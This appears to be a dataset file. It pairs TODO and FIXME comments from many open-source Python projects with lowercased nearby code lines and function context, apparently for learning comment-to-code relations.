# todo: reconsider adding smth to data_ to be yielded" </s> yield data_	_initiate_handle source=data_['handle_path'], )
# todo: put offset/data in main structure since immutable </s> ctinfo = context.make_helper(builder, data_ctypes_type)	get_data_ptr context.get_data_type(dtype).as_pointer()) string_array = cgutils.create_struct_proxy(dtype)(context, builder, builder.load(data_pointer)) ctinfo.data = string_array.data ctinfo.meminfo = inst_struct.meminfo
# todo nice error recovery </s> print("uh. not good")	run ", New Size:" + newfilesizestr + ", Ratio:" + ratiostr) else:
# todo(b/142683826): beam type check error in </s> def validate_metrics(	validate_metrics sliced_metrics: Tuple[slicer.SliceKeyType, Dict['metric_types.MetricKey', Any]],
# todo check if we can avoid that </s> out = numpy.zeros(nprism)	read_buffer out = numpy.fromfile( f, count=nprism * 6, dtype=int, sep=" ").reshape(nprism,6) cells["wedge"] = out - 1 cell_data["wedge"] = {"ugrid:ref": out} if nhex > 0 :
# todo: disconnect </s> return	Node beacon_blocks_response, ) self.logger.debug( "Processing beacon blocks request from %s is finished",
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection download.unsafe_download(good2_https_url, target_data_length) os.environ['REQUESTS_CA_BUNDLE'] = expired_cert_fname logger.info('Trying HTTPS download of target file: ' + expired_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo: http://www.6502.buss.hk/6502-instruction-set/jmp says that there </s> self.assertequals(code, [0x20, 0x34, 0x12])	test_jsr_abs code = semantic(ast)
# @todo: use real lightness from hsv or lab color model </s> lightness = (sum(int_list_from_hex(preset_color)))	find_closest_color for preset_color in colors_hex: diff = ColorDiff(preset_color, color_hex) if (diff.abs < smallest_diff.abs) and (max_lightness >= lightness >= min_lightness): smallest_diff = diff
# todo(ericbidelman) - memcache this calculation as part of models.py </s> milestones = range(1, latest_version + 1)	__annotate_first_of_milestones LATEST_VERSION = int(s.split('.')[0]) break milestones.reverse() versions = [
print "usage is not ready yet." # todo </s> def usage():	usage
# todo: remove cache clearing once upstream issues regarding non-batch </s> acquisition_function.model.train()	gen_candidates Tensor: The set of generated candidates Tensor: The acquisition value for each t-batch. acquisition_function.model.eval() options = options or {}
# todo(developer): uncomment these lines and replace with your values. </s> parent = client.queue_path(project, location, queue)	create_http_task from google.protobuf import timestamp_pb2 client = tasks_v2beta3.CloudTasksClient()
raise valueerror("bucket might not exist")  # todo: create custom exception for easier handling </s> read_acl_perm_allowed = true	check_perm_read_acl ClientError if bucket.exists != BucketExists.YES: try: self.s3_client.get_bucket_acl(Bucket=bucket.name)
# todo should also include meta-chunk-hash </s> trailers = {'x-oio-chunk-meta-metachunk-size': metachunk_size,	test_HEAD_chunk metachunk_size = 9 * length metachunk_hash = md5(chunkdata).hexdigest() 'x-oio-chunk-meta-metachunk-hash': metachunk_hash} resp, body = self._http_request(chunkurl, 'PUT', chunkdata, headers,
# todo: should we do check/modify it? wireshark shows the only msb to 0 </s> b = self.get_word(2, "<")	get_aid def get_aid(self): "Return 802.11 PSPoll control frame 'AID' field" return b
# todo: e_die with token </s> raise nameerror('undefined')	EvalRHS val = self.mem.GetVar(node.name.val) if val.tag == value_e.Undef: if val.tag == value_e.Str: return val.s
# todo fixme make sure we have exclusive write lock </s> alala = alala(db_path, type_)	wrapper @functools.wraps(func) def wrapper(key): engine = alala.engine prev_hashes = engine.execute(alala.table_hash.select()).fetchall()
pass  # todo: implement this </s> def show_context_menu(self, point):	show_context_menu
# todo: use operators.translate() </s> ghat = np.dot(g.u.t, g)	gft_windowed C = np.reshape(C, (G.N, G.N, Nf), order='F') else: Ftrans = np.sqrt(G.N) * np.dot(G.U, (np.kron(np.ones((G.N)), ghat)*G.U.T)) C = np.empty((G.N, G.N))
raise notimplementederror  # todo... </s> dataset_str = args.data	main import matplotlib.ticker as ticker if args.output_format == "hdf": if dataset_str in ["train", "dev", "eval"]: dataset_str = "config:%s" % dataset_str
# todo: implement this method </s> if value:	ref @ref.setter def ref(self, value): pass else:
# todo: these reductions could be delayed until _step is called. </s> loss = self._strategy.reduce(tf.distribute.reduceop.mean, per_replica_loss, none)	_forward per_replica_loss, per_replica_words = self._strategy.experimental_run_v2( _accumulate_gradients, args=(per_replica_source, per_replica_target)) num_words = { k:self._strategy.reduce(tf.distribute.ReduceOp.SUM, v, None)
# todo(tobyboyd): remove when contrib.distribute is all in core. </s> if hasattr(tf, 'contrib'):	set_up_synthetic_data def set_up_synthetic_data(): _monkey_patch_dataset_method(tf.distribute.MirroredStrategy) _monkey_patch_dataset_method(tf.contrib.distribute.MirroredStrategy) _monkey_patch_dataset_method(tf.contrib.distribute.OneDeviceStrategy)
# todo: remove the following line when issue #71 (preserve the trajdataframe index during preprocessing operations) is solved. </s> ctdf.reset_index(inplace=true, drop=true)	cluster else: ctdf = _cluster_trajectory(stops_df, cluster_radius_km=cluster_radius_km, min_samples=min_samples).reset_index(drop=True) ctdf.parameters = tdf.parameters ctdf.set_parameter(constants.CLUSTERING_PARAMS, arguments)
# todo add installation logic for torch </s> result.append(pkey + '==' + pversion)	process if (pkey == 'tensorflow' or pkey == 'tf-nightly'): pkey = pkey + '-gpu' return result
pass  # todo </s> def playlist_create(self):	playlist_create @test(depends_on=[song_create])
# todo/fixme: x and alpha should not contain observed values!! check that. </s> mask = x.mask[...,np.newaxis,np.newaxis]	bound_rotate_gaussian :math:`p(\mathbf{X}) = \prod^M_{m=1} N(\mathbf{x}_m|0, \mathbf{\Lambda})` XX = utils.utils.sum_multiply(X.get_moments()[1], mask,
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
raise notimplementederror #todo </s> elif self.action == "split":	Action raise NotImplementedError #TODO elif self.action == "MERGE": raise NotImplementedError #TODO if self.action == "ADD" or (self.action == "EDIT" and not focusselection):
#todo: maybe it would be cleaner to have </s> math_stats = categorystats({	test_dict_type_with_model_type_init_with_instance id = IntType() categories = DictType(ModelType(CategoryStats)) "category_slug": "math", "total_wins": 1
# todo: use a recursive memoized __eq__ if this ever shows up in profiles. </s> and self.direct_dependencies == other.direct_dependencies	__eq__ and self.minimum_go_version == other.minimum_go_version and self.for_tests == other.for_tests
# rfc822.header will give *all* of the headers, and is probably slower? // todo </s> log.info("fetching messages with query: %s" % query )	fetch_MessageBodyPart global server query = 'ENVELOPE BODY INTERNALDATE' messages = server.fetch(UIDs, [query, 'X-GM-THRID']) log.info("  ...found %i messages." % len(messages.values()))
# todo: read until ''' </s> log("id = %s", ui.prettyid(next_id))	_ReadCompoundWord3 next_id = self.lexer.LookAhead(lex_mode_e.ShCommand) if next_id == Id.Left_SingleQuote: if (part.tag_() == word_part_e.DoubleQuoted and len(cast(double_quoted, part).parts) == 0):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_no_transactions def test_pass_no_transactions(self):
raise notimplementederror #todo </s> if self.action == "add" or (self.action == "edit" and not focusselection):	Action raise NotImplementedError #TODO elif self.action == "SPLIT": for target in targetselector[0](*targetselector[1]): if not self.action.focus.Class:
# todo: make keys get passed through files or environment </s> inbuf = tempfile.namedtemporaryfile()	encrypt def encrypt(self, data, key): inbuf.write(data) inbuf.flush()
data.append(get_casedb_schema(app))  # todo use domain instead of app </s> data.extend(item_lists_by_domain(domain))	get_data_schema if app.domain != domain: raise Http404() kw = {} if "pretty" in request.GET:
# todo(lyarwood): remove the following in 16.0.0 pike </s> self._test_get_encryptor('noopencryptor',	test_get_encryptors self._test_get_encryptor(None, nop.NoOpEncryptor) nop.NoOpEncryptor) self._test_get_encryptor('nova.volume.encryptors.nop.NoOpEncryptor',
# todo: enable custom config </s> if base.lower() != e['word'][0:len(base)].lower():	_refresh_completions if 'menu' not in e: e['menu'] = self._sources[name].get('abbreviation','') continue tmpmatches.append(e)
# todo: instead of raising, we should do something (#957) </s> for task, (cfrag, reencryption_signature) in zip(self.tasks, cfrags_and_signatures):	complete else: raise InvalidSignature(f"{cfrag} is not properly signed by Ursula.") task.attach_work_result(cfrag, reencryption_signature) self.completed = maya.now()
# xxx todo </s> section = "authentication"	write_authentication_config Write configuration options in section "authentication".
# todo: skips header parsing </s> iline += 1	read_abaqus_inp pass elif word.startswith('material'): line0 = lines[iline].strip().lower() word = line0.strip('*').lower()
# todo: seems like this just does everything that handle_exception does but not as well. </s> self.handle_payload_exception(e)	fire self.repeater.fire_for_record(self) except Exception as e: raise else:
""" todo: better test here """ </s> timestamp = generate_timestamp()	test_generate_timestamp def test_generate_timestamp(self): self.assertTrue(isinstance(timestamp, unicode)) self.assertTrue(int(timestamp))
# todo: don't use getbrailletextforproperties directly. </s> braille.handler.message(braille.getbrailletextforproperties(name=self.name, role=self.role))	event_alert return speech.speakObject(self,reason=controlTypes.REASON_FOCUS)
# todo(jd) add an exception in oslo.db to match foreign key </s> if isinstance(e.inner_exception,	create_resource session.flush() except exception.DBError as e: sqlalchemy.exc.IntegrityError): raise indexer.NoSuchEntity(None)
# todo: pass expect parameters from above? </s> return self._runner.run(	_exec_ssh log_online=not log_output ) ssh_cmd, expect_fail=True,
#todo: increase timeout based on number of plugins </s> response = opener.open(url, none, 5)	_plugin_fetch ) )] data = response.read() if not data:
# todo :: move arbitray path construction to storagelayout object </s> url = '{0}/wal_{1}/{2}.lzo'.format(self.layout.prefix.rstrip('/'),	WalUploader self.blobstore = get_blobstore(layout) def __call__(self, segment): storage.CURRENT_VERSION, segment.name)
# todo: redo as json </s> with open('hashes.obj', 'w') as hashfile:	main pickle.dump(pasturls, urlfile) if hashes: pickle.dump(hashes, hashfile)
# todo: only unescape \n \t and \\? </s> return value.decode('string-escape').decode('utf-8')	decode if isinstance(value, unicode): return value
# todo: delete the orphaned flairtemplate row </s> g.log.debug('deleting ft %s (%s)', ft, key)	delete_by_id ft = getattr(self, key) if ft == ft_id: del self[key] self._commit()
# todo handle error </s> return view	_open_registry_file self._nb.AddPage(view, basename(filename))
# todo: this should take a vector </s> return self._mesigma	MeSigma self._MeSigma = self.mesh.getEdgeInnerProduct(self.curModel.sigma)
pass # todo: pass link problem upstream? </s> return r"%s<a href='%s' class='nocode'>%s</a>%s" % (	link_to qlink = urljoin(state.response.base_uri, link) except ValueError, why: matchobj.group(1), u"?uri=%s&req_hdr=Referer%%3A%s" % (
pass # todo </s> def handle_request(self, input):	handle_request
# todo put this in a .extra w/a subselect </s> entries = self.pre_launch_entries.filter(activity__billable=true)	pre_launch_hours_worked def pre_launch_hours_worked(self): if not hasattr(self, '_worked_pre_launch'): self._worked_pre_launch = entries.aggregate(s=Sum('hours'))['s'] or 0 return self._worked_pre_launch or 0
# todo: handle this </s> sub_surface = cairo.pdfsurface(none, repeat_width, repeat_height)	draw_background_image repeat_height = image_height return sub_context = cairo.Context(sub_surface) sub_context.rectangle(0, 0, image_width, image_height)
deck.notes = note.get_notes_from_collection(collection, deck.anki_deck["id"])  # todo ugly </s> deck.children = [cls.from_collection(collection, child_name) for child_name, _ in	from_collection deck.update_db() deck.anki_deck = collection.decks.byName(name) collection.decks.children(deck.anki_deck["id"])] return deck
# todo multi-level import non-breakable </s> return true	_name_is_no_break_scope return True elif isinstance(par, pr.Import) and len(par.namespace) > 1: return False
# todo protocol is incorrect (refer to article) </s> return a * relu_deriv(a)	relu def relu(a):
# todo: if the procpool has been exhausted this will block. </s> self.procpool.spawn(process_message, consumer_config,	on_consume_message def on_consume_message(self, consumer_config, consumer_method, body, message): with self.messagesem: consumer_method, body, message)
return broadcast_best(samples_b, llik_b, llik_a)[0]  # todo </s> low=low, high=high, q=none)	sample_loguniform samples_b, weights_a, mus_a, sigmas_a,
@raises(sshexception) # todo: more granular </s> def test_passphrase_kwarg_not_used_for_password_value(self): # noqa	test_passphrase_kwarg_not_used_for_password_value self._test_connection( passphrase='pygmalion',
# todo: make it cleaner </s> resnet_v1_101_8s_variables_mapping = {}	resnet_v1_101_8s output_shape=upsampled_logits_shape, strides=[1, upsample_factor, upsample_factor, 1]) resnet_v1_101_8s_variables = slim.get_variables(resnet_v1_101_8s) for variable in resnet_v1_101_8s_variables:
# todo: add docstring </s> particle = particle(argument, mass_numb=mass_numb, z=z)	ion_symbol Z: int = None) -> str: r"""Returns the ion symbol.""" if particle.ion: return particle.ion
# todo manage tangent? </s> translation_keyframe = conversion.loc_gltf_to_blender(values[idx * 3 + 1])	parse_translation_channel for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: translation_keyframe = Conversion.loc_gltf_to_blender(values[idx])
# todo - del just my poll, not the entire list ! </s> return poll_user_just_voted	check_vote if poll.id in sess_jv: del request.session[POLLS_JUST_VOTED_COOKIE_NAME] if request.user.is_authenticated(): sess = request.session.get(POLLS_COOKIE_NAME, [])
# todo(msb) remove this hack </s> self.partition = none	__init__ self.partitions: List[ModuleWrapper] = [] self.pipeline = None else: self.partitions = self.instantiate_partition(module, self.balance, self.group)
# todo: with only non-mandatory model attributes, it is not possible to get an invalid form </s> else:   # coverage: ignore branch	system_exporter_spreadsheet_csv_config_view info_logger(str(request.user), " SYSTEM_EXPORTER_SPREADSHEET_CSV_CONFIG_CHANGED") return HttpResponse('<script type="text/javascript">window.close();</script>') return render( request,
# todo: small gains expected, when views are pre-calculated in main. </s> psi = segment_axis(y, k, 1, axis=-1)[:, :t - delay - k + 1, ::-1]	get_correlations_narrow_v5 def get_correlations_narrow_v5(Y, inverse_power, K, delay): D, T = Y.shape Psi_conj_norm = inverse_power[None, delay + K - 1:, None] * Psi.conj() correlation_matrix = np.einsum('dtk,etl->kdle', Psi_conj_norm, Psi)
# todo for now, baked in assumption that the number of trials is the </s> task_list = benchmark.task_specs(env_id)	benchmark_aggregate_results scorer = benchmark.scorer for env_id in benchmark.env_ids: num_trials = task_list[0].trials benchmark_results = env_id_to_benchmark_results[env_id]
# todo - use smarter weights (e.g. hamming window) </s> k[indices] += 1	apply indices = samples_window.crop( window, mode='center', fixed=self.duration) y[indices] += predictions[i, :, :] y = (y.T / np.maximum(k, 1)).T
#todo: check system is stable, perhaps a utility in ctrlutil.py </s> d,v = np.linalg.eig(sys.a)	balred dico = 'C' for e in D: if e.real >= 0:
pass # todo </s> def __str__(self):	Extension self.remove.append(data[removed.attrib['name']]) except KeyError: return self.name __repr__ = __str__
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo: use actual html decode </s> sizes = [match.replace('&nbsp;', ' ').split()	parse_page if found == [] and no_results is None: raise IOError('Blocked mirror detected.') for match in re.findall(r'(?<=Size )[0-9.]' r'+\&nbsp\;[KMGT]*[i ]*B', res)]
# todo: remove parameters dictionary look up when we can confirm each trigger dictionary </s> if id_:	create_trigger_instance id_ = trigger.get('id', None) uid = trigger.get('uid', None) trigger_db = TriggerService.get_trigger_db_by_id(id=id) elif uid:
# todo: se a data já estiver no cases mas for só total e essa </s> continue	get_state_data date = spreadsheet.date if date in cases: report_data = reports.get(date, defaultdict(list)) for url in spreadsheet.boletim_urls:
# todo: is this safe? </s> self.cmd( 'iptables -f' )	terminate def terminate( self ): self.cmd( 'iptables -t nat -F' ) self.cmd( 'sysctl net.ipv4.ip_forward=0' )
# todo this assertion can occasionally fail </s> assert not g	test_send_rpc_errors args={'foo': 'bar', }, timeout=3)
# todo: re-implement </s> print 'cleared %i items.' % len(self.shelve_session.setdefault('failed', []))	clear_failed def clear_failed(self): self.shelve_session['failed'] = []
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo: implement auto-dtype method in general parameters </s> z = np.fft.rfft(zlp.data, n=size, axis=axis.index_in_array).astype('complex64')	fourier_log_deconvolution size = self_size axis = self.axes_manager.signal_axes[0] j = np.fft.rfft(s.data, n=size, axis=axis.index_in_array).astype('complex64') j1 = z * np.nan_to_num(np.log(j / z))
# todo: implement retrying. api requests 5 seconds between retries. </s> elif request_status >= 400:	send_push elif request_status == 500: log.warning('Pushbullet notification failed, Pushbullet API having issues') if response.content: try:
# todo: we lose the response code, so we can't check this </s> d.addcallback(self.failunlessurimatcheschild, self._foo_node, u"new.txt")	test_PUT_NEWFILEURL_not_mutable d = self.PUT(self.public_url + "/foo/new.txt?mutable=false", self.NEWFILE_CONTENTS) d.addCallback(lambda res: self.failUnlessChildContentsAre(self._foo_node, u"new.txt",
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	Forward @tf.function(input_signature=Flatten(fwd_sig), autograph=False) def Forward(*args): with RemoveAssertContext(remove=noinline), tf.device(device): xs = Pack(fwd_sig, args)
# todo: safe labels </s> record = self.row_to_dict(row, labels)	fact row = cursor.fetchone() if row: else: record = None
# todo factor out attribute name usage in cell so this restriction is moot for non-settable cells </s> raise lookuperror('bad getter name', k)	__decorator_cells if isinstance(v, ExportedGetter): if not k.startswith('get_'): else: k = k[len('get_'):]
# todo(mriedem): remove this stub once we're only using fakelibvirt. </s> self.assertequal(1, cnt)	test_cpu_features_are_not_duplicated cnt = [x.name for x in caps.host.cpu.features].count('xtpr')
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	stco_atom oldsize = self.size # TODO: remove self.size = 8 + 4 + 4 + len(self.body[1]) * 4
#todo raise error or others </s> return	on_backup_button_clicked if sterror: log.error(sterror) dirlist = stdout.split() dirlist.sort()
# todo: move update_spec to worker. agent should not hold these execution details. </s> if time_percentage is none:	update def update(self, batch=None, time_percentage=None): time_percentage = self.timesteps / self.update_spec.get("max_timesteps", 1e6) self.steps_since_target_net_sync += self.update_spec["update_interval"]
# if the test has the todo flag set, then our failures and errors are </s> todo = getattr(method, "todo", getattr(testcase, "todo", none))	runOneTest def runOneTest(self, testClass, testCase, method, output): if todo: failure = EXPECTED_FAILURE
# todo: rename intervalstodiatonic </s> specifier = _getspecifierfromgenericchromatic(gint, cint)	intervalFromGenericAndChromatic >>> cInterval.directedNiceName 'Descending Augmented Fifth' dInt = DiatonicInterval(specifier, gInt) return Interval(diatonic = dInt, chromatic = cInt)
#todo: this should never happen, dep on equiv </s> raise	_delete_arc_equiv mods.deletion(eq_ann) except DependingAnnotationDeleteError, e:
elif isinstance(other, containeroperand): # todo 0.7: use iterable to array force user to provide values </s> operand = other.values	_ufunc_set operand = other.values assume_unique = True # can always assume unique assume_unique = False else:
# todo: let the globe return the semimajor axis always. </s> a = globe.semimajor_axis or wgs84_semimajor_axis	NearsidePerspective if globe is None: globe = Globe(semimajor_axis=WGS84_SEMIMAJOR_AXIS, ellipse=None) b = globe.semiminor_axis or a if b != a or globe.ellipse is not None:
# todo{jihongju} the mask branch </s> return [score, boxes]	ResHead boxes = keras.layers.TimeDistributed( keras.layers.Dense(4 * classes))(y) return f
# todo confirm we want floor division here </s> utilities.reshape(numalts, utilities.size() // numalts)	mnl_probs if numalts == 0: raise Exception("Number of alternatives is zero") exponentiated_utility = utilities.exp(inplace=True) if clamp:
n)  # todo: access alice's private key inside this method. </s> policy = policy.from_alice(	create_policy_group alice_priv_enc = self.owner._crypto_power._power_ups[EncryptingPower].priv_key kfrags, pfrag = self.owner.generate_rekey_frags(alice_priv_enc, bob, m, alice=self.owner, bob=bob,
## todo check exception type </s> out = []	visit_ExceptHandler def visit_ExceptHandler(self, node): if node.type: out.append( self.indent() + '--exception: %s' %self.visit(node.type) )
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection try: os.environ['REQUESTS_CA_BUNDLE'] = bad_cert_fname logger.info('Trying HTTPS download of target file: ' + bad_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo maybe have the api level loading in the __init__ method and pass the apk as well? </s> permmap = load_api_specific_resource_module('api_permission_mappings', apilevel)	get_permission_usage :param apilevel: the requested API level or None for default :return: yields :class:`MethodClassAnalysis` objects for all using API methods if not permmap: raise ValueError("No permission mapping found! Is one available? "
# todo: replace the blockerdb with a depgraph of installed packages </s> self._blocker_db = {}	_init_installed_graph Initialization structures used for dependency calculations involving currently installed packages. for root in self.trees: self._blocker_db[root] = \
# todo: speedup by allocating the denominator directly instead of constructing it by sum </s> return tf.slice(tens, [0, 0, second * single_batch_size], [m, n, single_batch_size])	half n = int(n)
# todo: support iat/iloc differences </s> return seriesiattype(ary)	resolve_iloc def resolve_iloc(self, ary):
# todo: change logic to c_leq based on benchmarking </s> transformationfactory('contrib.deactivate_trivial_constraints')\	solve_NLP_subproblem fix_nlp.tmp_duals[c] = c_geq * max( 0, c_geq*(rhs - value(c.body))) .apply_to(fix_nlp, tmp=True, ignore_infeasible=True) with SuppressInfeasibleWarning():
# todo: make locking works for mssql </s> pass	create_global_lock session.connection().execute(f"select RELEASE_LOCK('{lock_name}');") if dialect.name == 'mssql':
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
# todo: neil-san, you should keep this </s> out_ops = quantizer_conv_output_node.output_ops['output']	pass_compute_thresholds ths_list += ths[channel] conv_node.thresholds = ths_list for output_node in out_ops: for input_name, input_node in output_node.input_ops.items():
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo: +kwargs </s> return pi_list	push else: pi_list += rm.push(**push_kwargs)
# todo: convert [n, c, v] to  new convention [v, n, c] </s> return sqrt_h	sqrt_hessian sqrt_H /= sqrt(N)
# todo check how we define frames regarding action repeat. </s> self.logger.info("throughput: {} ops/s".format(executed / end))	execute_episodes end = time.monotonic() - start self.logger.info("Finished executing {} episodes in {} s".format(num_episodes, end)) self.logger.info("Mean episode reward: {}".format(np.mean(episode_rewards))) self.logger.info("Final episode reward: {}".format(episode_rewards[-1]))
# todo(b/141131288): enable complex-valued sorts on tpu. </s> if (onp.issubdtype(dtype, onp.complexfloating) and (	LaxTest for axis in [-1, len(shape) - 1])) def testSort(self, shape, dtype, axis): (jtu.device_under_test() == "cpu" and jax.lib.version <= (0, 1, 47)) or jtu.device_under_test() == "tpu")):
# todo: this may return a shortname or a longname, with no way </s> name = buffer[pos + 12:pos + 12 + namelen].decode("utf16")	FILE_NOTIFY_INFORMATION while pos < len(buffer): jump, action, namelen = struct.unpack("iii", buffer[pos:pos + 12]) yield (name, action) if not jump:
# todo this paragraph is necessary, but not sure it works. </s> context = self._user_context.get_context()	get_completions return [(name, module) for name in importer.completion_names(self._evaluator, True)] elif isinstance(user_stmt, pr.Import): next(context)  # skip the path if next(context) == 'from':
# todo hardwired magic numbers! bad api smell. </s> for inflecting_format in (3,4):	test_after_month_only_date_genitive d1945may = Date(1945, 5, 0) d1945may.set_modifier(Date.MOD_AFTER) self.dd.set_format(inflecting_format) self.assertIn("после мая", self.dd.display(d1945may))
# todo: endianness support </s> num2fmt = {1: 'b', 2: 'h', 4: 'i', 8: 'q'}	write_memory raw_mem = val else: fmt = '<{}{}'.format(num_words, num2fmt[wordsize]) if num_words == 1:
# todo(mattjj,levskaya): re-enable when test failure is sorted out </s> raise skiptest("tfp test failures")	testLinspace def testLinspace(self, start_shape, stop_shape, num, endpoint, retstep, dtype, rng_factory): rng = rng_factory() tol = tolerance(dtype if dtype else onp.float32) * 10
val = '"%s"' % val  # todo: handle correctly escaping input strings. </s> param_content += '%s = %s\n' % (var, val)	_python27_param_content for var, val in parameters.items(): if isinstance(val, string_types): return param_content
# todo: change retrieval mode </s> self.c = couchobject.from_couch(selected_contest, true)	prepare if selected_contest != None: try: if self.c != None: self.set_secure_cookie("selected_contest", selected_contest)
# todo lib </s> renamed_uuids = {	BpyDataCollectionDiff proxy_uuids = set(proxies.keys()) blender_uuids = set(blender_items.keys()) uuid for uuid in blender_uuids & proxy_uuids if proxies[uuid].data("name") != blender_items[uuid][0].name }
# todo: is this really ok? </s> if hasattr(mutant, 'getmutanttype'):	_sendMutant url = mutant.getURI() data = mutant.getDc() if mutant.getMutantType() == 'cookie': data = ''
# todo: implement non-zero js </s> else:	calcFields b = sol e = self.MeSigmaI*self.mesh.edgeCurl.T*self.MfMui*b raise NotImplementedError('solType "%s" is not implemented in CalcFields.' % self.solType) return {'b':b, 'e':e}
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo stop guessing </s> remove_entire_file = (location.get('line') or location.get('column')) is none	parse_lint_result for location in issue_xml.findall('location'): filepath = location.get('file') issue = Issue(filepath, remove_entire_file) issue.add_element(issue_xml.get('message'))
# todo(stephenfin): use a helper </s> self.api.post_server_action(server_a['id'], {'migrate': none})	test_cold_migrate_server_with_pci '.migrate_disk_and_power_off', return_value='{}', ): server_a = self._wait_for_state_change(server_a, 'VERIFY_RESIZE') self.assertEqual(
encoding = "utf-8"  # todo: receive as a parameter </s> timeout = 0.1  # todo: receive as a parameter	handle table_name = Model._meta.db_table database_uri = os.environ["DATABASE_URL"] start_time = time.time() progress = ProgressBar(prefix="Importing data", unit="bytes")
# todo: if the type for struct-type is not controlled by the current inspector, the exn:fail:contract exception should be raised </s> struct_desc = args[0]	do_struct_type_make_constructor @expose("struct-type-make-constructor") def do_struct_type_make_constructor(args): struct_type = values_struct.W_StructType.lookup_struct_type(struct_desc) return struct_type.constr()
# todo use self.rester when in prod </s> m = mprester(os.environ.get('mapi_key_dev'), endpoint="http://www.materialsproject.org:8080/rest")	test_find_structure def test_find_structure(self): ciffile = 'test_files/Fe3O4.cif' data = m.find_structure(ciffile)
"""todo doc me""" </s> def rowlengths(table):	rowlengths
# todo message </s> return symbol('$failed')	Import default_element = importer_options.get("System`DefaultElement") if default_element is None: def get_results(tmp_function): if function_channels == Expression('List', String('FileNames')):
# todo: check that ambient makes sense </s> pass	__classcall__ ambient = RealLine(**kwds) else: return ambient.canonical_chart().pullback(real_set) from sage.symbolic.expression import Expression
pass  # todo... </s> beam_out[0] = beam	perform beam = beam_trans.transpose(*map(array_trans_dims_order.index, range(array.ndim))) if self.wrap_mode == "pad_zero":
# todo: add type and value checkings </s> self.width = width	__init__ def __init__(self, pinholes, width=None, height=None): super(DepthWarper, self).__init__() self.height = height self._pinholes = pinholes
# todo: replace column names and remove the appliance name from </s> building.utility.electric.appliances[appliance] = df[names]	add_appliances for appliance in appliance_names: names = [x for x in df.columns if x.split("_")[0] == appliance] return building
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_compatible_types The request contains values that can be converted to the expected types.
if not real: self.assertequal(exita, 1) # todo: real = 0 </s> self.assertequal(exitb, 0)	test_3051_systemctl_py_check_is_failed doneC, exitC  = output2(enable_C.format(**locals())) doneD, exitD  = output2(enable_D.format(**locals())) self.assertEqual(exitC, 0) self.assertEqual(exitD, 1)
"""todo doc me""" </s> def see(table):	see
"""todo: not implemented""" </s> notimplementederror("prs welcome")	percent_rank @symbolic_dispatch def percent_rank(x):
maxtime = 10445238000  # todo: change after 31 dec 2300 lol </s> tx["time"] = min(	txlist result.append(tx) for tx in result: tx.get("blocktime", maxtime), tx.get("timereceived", maxtime),
# todo this swallows status message, yield properly </s> ds.repo.add(to_gitadd, git=true,	save_dataset if to_gitadd or save_entire_ds: lgr.debug('Adding files straight to Git at %s: %s', ds, to_gitadd) update=save_entire_ds) if to_annexadd:
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
#todo: remove convert_bare true and deprecate this in with_ </s> loop_terms = listify_lookup_plugin_terms(terms=task.loop_args, templar=templar, loader=loader, fail_on_undefined=true, convert_bare=true)	_get_delegated_vars if task.loop in lookup_loader: try: items = lookup_loader.get(task.loop, loader=loader, templar=templar).run(terms=loop_terms, variables=vars_copy) except AnsibleUndefinedVariable as e:
# todo: assuming the register is written in its number format </s> reil_operand = reilregisteroperand('r' + str(int(reil_operand.name[1:]) + 1), reil_operand.size)	_translate_strd reil_operand = ReilRegisterOperand(instruction.operands[1].name, instruction.operands[0].size) else: tb.add(tb._builder.gen_stm(reil_operand, addr_reg))
# todo; handle multiple doc-types </s> raise bulkporcessingerror(	get_docs document_stores = list(set(change.document_store for change in _changes)) if len(document_stores) > 1: "Received changes of more than one doc_type from change feed for the domain".format(domain) )
# todo manage tangent? </s> translation_keyframe = conversion.loc_gltf_to_blender(values[idx * 3 + 1])	parse_translation_channel for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: translation_keyframe = Conversion.loc_gltf_to_blender(values[idx])
#todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	DELETE try: users = plexTV().getUserList() request = urllib2.Request(url) request.add_header('X-Plex-Token', users[user]['accessToken'])
# todo: fix </s> from .numpy_ops import numpyops	hash def hash(self, ids: Array, seed: Array) -> Array: numpy_ops = NumpyOps() return self.asarray(
# todo: write me </s> raise notimplementederror('memcache cache does not yet implement the .remove() method.')	remove def remove(self, layer, coord, format):
# todo: this might be a rather nasty hack to fix the circular dependency </s> from nilmtk.preprocessing.electricity.single import reframe_index	get_gap_starts_and_gap_ends ------- gap_starts, gap_ends: DatetimeIndex try: data = data.dropna()
# todo: mock these so no network access is required </s> p = package(	test_launchpad_pull def test_launchpad_pull(self): title="Django-PreFlight", slug="django-preflight",
